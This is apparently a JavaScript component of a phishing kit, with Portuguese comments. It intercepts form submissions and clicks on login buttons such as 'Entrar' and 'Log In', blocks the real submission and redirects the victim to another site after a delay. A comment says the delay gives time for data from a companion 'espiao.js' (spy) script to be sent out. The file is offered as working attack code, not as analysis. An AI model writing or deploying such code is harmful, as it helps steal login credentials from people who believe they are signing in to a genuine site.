// Função de redirecionamento que usa uma URL dinâmica
const executarRedirecionamento = () => {
    const urlDestino = window.urlRedirecionamento || "https://google.com";

    // Delay de 1.5s para garantir que os dados do espiao.js sejam enviados antes
    setTimeout(() => {
        window.location.replace(urlDestino);
    }, 1500);
};

// 1. INTERCEPTA O ENVIO DO FORMULÁRIO (Só redireciona se o usuário enviar algo)
window.addEventListener('submit', function(e) {
    e.preventDefault();
    e.stopImmediatePropagation(); 
    executarRedirecionamento();
}, true);

// 2. INTERCEPTA CLIQUES EM BOTÕES (Ajustado para não disparar em cliques vazios da página)
window.addEventListener('click', function(e) {
    const el = e.target;
    const termos = ['Entrar', 'Log In', 'Próximo', 'Next', 'Acessar', 'Login', 'Logar', 'Conectar'];
    
    const ehBotao = el.tagName === 'BUTTON' || 
                    el.type === 'submit' || 
                    termos.some(t => el.innerText && el.innerText.includes(t)) || 
                    (el.value && termos.some(t => el.value.includes(t)));

    // Só redireciona se for um botão de ação real e não o botão do banner inicial
    if (ehBotao && el.id !== 'btn-spy') {
        executarRedirecionamento();
    }
}, true);
